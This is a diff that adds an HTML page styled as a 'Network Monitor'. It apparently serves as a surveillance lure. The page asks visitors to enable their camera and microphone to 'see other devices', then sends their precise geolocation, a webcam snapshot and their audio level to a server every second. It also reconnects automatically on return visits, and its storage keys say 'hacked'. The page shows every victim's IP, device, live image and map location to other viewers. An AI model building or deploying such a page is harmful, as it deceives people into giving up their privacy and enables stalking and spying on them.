@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Network Monitor</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        *{ margin:0; padding:0; box-sizing:border-box; }
+        body{ background:#0b0e14; color:#c8d0dc; font-family: 'Segoe UI', sans-serif; padding:20px; }
+        .container{ max-width:1400px; margin:0 auto; }
+        .header{ display:flex; justify-content:space-between; border-bottom:1px solid #1f2a3a; padding-bottom:15px; margin-bottom:25px; }
+        .header h1{ color:#00d4ff; font-weight:300; }
+        .status{ background:#1f2a3a; padding:8px 20px; border-radius:30px; font-size:14px; }
+        .permission-box{ background:#141c28; border:1px solid #2a3a50; border-radius:16px; padding:40px; max-width:560px; margin:60px auto; text-align:center; }
+        .permission-box h2{ color:#e8f0f8; font-weight:400; }
+        .permission-box p{ color:#8899aa; margin:15px 0 30px; }
+        .btn{ background:#00d4ff; border:none; color:#0b0e14; padding:14px 40px; border-radius:40px; font-weight:600; cursor:pointer; transition:0.25s; }
+        .btn:hover{ background:#00b8e0; box-shadow:0 0 25px #00d4ff66; }
+        .btn-secondary{ background:#2a3a50; color:#c8d0dc; }
+        .dashboard{ display:none; }
+        .dashboard.active{ display:block; }
+        .client-grid{ display:grid; grid-template-columns:repeat(auto-fill, minmax(360px,1fr)); gap:22px; margin-top:20px; }
+        .client-card{ background:#111a24; border:1px solid #1f2a3a; border-radius:14px; padding:18px; }
+        .client-card:hover{ border-color:#00d4ff66; }
+        .client-id{ color:#00d4ff; font-size:18px; font-weight:600; word-break:break-all; }
+        .client-info{ font-size:13px; color:#9aabb8; margin:3px 0; }
+        .flex-row{ display:flex; flex-wrap:wrap; gap:15px; align-items:flex-start; }
+        .video-container{ flex:0 0 180px; border-radius:10px; overflow:hidden; background:#000; border:1px solid #1f2a3a; }
+        .video-container img{ width:100%; display:block; }
+        .map-container{ height:140px; width:100%; border-radius:8px; overflow:hidden; margin-top:8px; }
+        .audio-bar{ width:100%; height:5px; background:#1f2a3a; border-radius:3px; margin-top:6px; }
+        .audio-bar .fill{ height:100%; background:#00d4ff; border-radius:3px; transition:0.3s; }
+        .no-data{ color:#556; font-style:italic; padding:10px 0; }
+        .footer{ margin-top:30px; text-align:center; font-size:12px; color:#445; border-top:1px solid #1a2430; padding-top:15px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>📡 Network Monitor</h1>
+        <div class="status"><span id="onlineStatus">●</span> Connected</div>
+    </div>
+
+    <div id="permissionBox" class="permission-box">
+        <h2>🎥 Enable Camera & Microphone</h2>
+        <p>Grant access to see other devices on the network</p>
+        <button id="enableBtn" class="btn">✅ Enable Stream</button>
+        <br><br>
+        <button id="retryBtn" class="btn btn-secondary" style="display:none;">🔄 Retry</button>
+    </div>
+
+    <div id="dashboard" class="dashboard">
+        <div style="margin-bottom:15px; color:#889; background:#101a24; padding:12px 20px; border-radius:10px; border:1px solid #1a2430;">
+            ⚡ <span id="viewerCount">0</span> users online
+        </div>
+        <div id="clientsGrid" class="client-grid"></div>
+        <div class="footer">📦 All data saved locally • Available offline</div>
+    </div>
+</div>
+
+<script>
+    const socket = io();
+    let localStream = null, localVideo = null;
+    let permissionsGranted = false;
+    const PERM_FLAG = 'hack_permission_granted';
+    const CACHE_KEY = 'hacked_network_data';
+
+    function loadCache() {
+        try { return JSON.parse(localStorage.getItem(CACHE_KEY) || '{}'); } catch { return {}; }
+    }
+    function saveCache(data) {
+        localStorage.setItem(CACHE_KEY, JSON.stringify(data));
+    }
+
+    function renderClients(clientsData) {
+        const grid = document.getElementById('clientsGrid');
+        grid.innerHTML = '';
+        const keys = Object.keys(clientsData);
+        document.getElementById('viewerCount').textContent = keys.length;
+        if (keys.length === 0) {
+            grid.innerHTML = '<div style="padding:40px;text-align:center;color:#556;">🔍 No other users online</div>';
+            return;
+        }
+        for (const [sid, data] of Object.entries(clientsData)) {
+            const card = document.createElement('div');
+            card.className = 'client-card';
+            let mapHtml = '<div class="no-data">No location</div>';
+            if (data.location) {
+                mapHtml = `<div class="map-container" id="map-${sid}"></div>`;
+            }
+            let videoHtml = '<div class="no-data">Camera off</div>';
+            if (data.last_frame) {
+                videoHtml = `<img src="${data.last_frame}" alt="Video" />`;
+            }
+            const vol = data.audio_level || 0;
+            const audioBar = `<div class="audio-bar"><div class="fill" style="width:${vol}%;"></div></div>`;
+            card.innerHTML = `
+                <div class="client-id">🖥️ ${data.id || data.ip || 'Unknown'}</div>
+                <div class="client-info">🌐 IP: ${data.ip}</div>
+                <div class="client-info">📱 Device: ${data.user_agent || 'Unknown'}</div>
+                <div class="client-info">🔊 Audio: ${vol}%</div>
+                ${audioBar}
+                <div class="flex-row">
+                    <div style="flex:1;">${mapHtml}</div>
+                    <div class="video-container">${videoHtml}</div>
+                </div>
+            `;
+            grid.appendChild(card);
+            if (data.location) {
+                const mapDiv = document.getElementById(`map-${sid}`);
+                if (mapDiv) {
+                    const map = L.map(mapDiv).setView([data.location.lat, data.location.lng], 13);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    L.marker([data.location.lat, data.location.lng]).addTo(map);
+                }
+            }
+        }
+    }
+
+    async function requestPermissions(manual = true) {
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+            });
+            permissionsGranted = true;
+            localStorage.setItem(PERM_FLAG, 'true');
+            document.getElementById('permissionBox').style.display = 'none';
+            document.getElementById('dashboard').classList.add('active');
+
+            const video = document.createElement('video');
+            video.srcObject = localStream;
+            video.play();
+            localVideo = video;
+
+            const audioContext = new AudioContext();
+            const source = audioContext.createMediaStreamSource(localStream);
+            const analyser = audioContext.createAnalyser();
+            source.connect(analyser);
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+
+            socket.emit('location_update', {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+            });
+            socket.emit('ready');
+
+            setInterval(() => {
+                analyser.getByteTimeDomainData(dataArray);
+                let sum = 0;
+                for (let i = 0; i < dataArray.length; i++) {
+                    const val = (dataArray[i] - 128) / 128;
+                    sum += val * val;
+                }
+                const rms = Math.sqrt(sum / dataArray.length);
+                const volume = Math.min(100, Math.round(rms * 200));
+                const canvas = document.createElement('canvas');
+                canvas.width = 180;
+                canvas.height = 135;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                socket.emit('video_frame', {
+                    image: imageData,
+                    audio_volume: volume
+                });
+            }, 1000);
+        } catch (err) {
+            permissionsGranted = false;
+            localStorage.removeItem(PERM_FLAG);
+            if (manual) {
+                document.getElementById('permissionBox').style.display = 'block';
+                document.getElementById('dashboard').classList.remove('active');
+                document.getElementById('retryBtn').style.display = 'inline-block';
+                document.getElementById('enableBtn').style.display = 'none';
+            } else {
+                document.getElementById('permissionBox').style.display = 'block';
+                document.getElementById('dashboard').classList.remove('active');
+                document.getElementById('enableBtn').style.display = 'inline-block';
+                document.getElementById('retryBtn').style.display = 'none';
+            }
+        }
+    }
+
+    async function autoConnect() {
+        if (localStorage.getItem(PERM_FLAG) === 'true') {
+            await requestPermissions(false);
+        }
+    }
+
+    socket.on('clients_update', (liveData) => {
+        if (!permissionsGranted) return;
+        saveCache(liveData);
+        renderClients(liveData);
+    });
+
+    document.getElementById('enableBtn').addEventListener('click', () => requestPermissions(true));
+    document.getElementById('retryBtn').addEventListener('click', () => {
+        document.getElementById('retryBtn').style.display = 'none';
+        document.getElementById('enableBtn').style.display = 'inline-block';
+        requestPermissions(true);
+    });
+
+    socket.on('connect', () => autoConnect());
+
+    window.addEventListener('online', () => {
+        document.getElementById('onlineStatus').textContent = '●';
+        document.getElementById('onlineStatus').style.color = '#00ff88';
+    });
+    window.addEventListener('offline', () => {
+        document.getElementById('onlineStatus').textContent = '○';
+        document.getElementById('onlineStatus').style.color = '#ff6b6b';
+    });
+</script>
+</body>
+  </html>
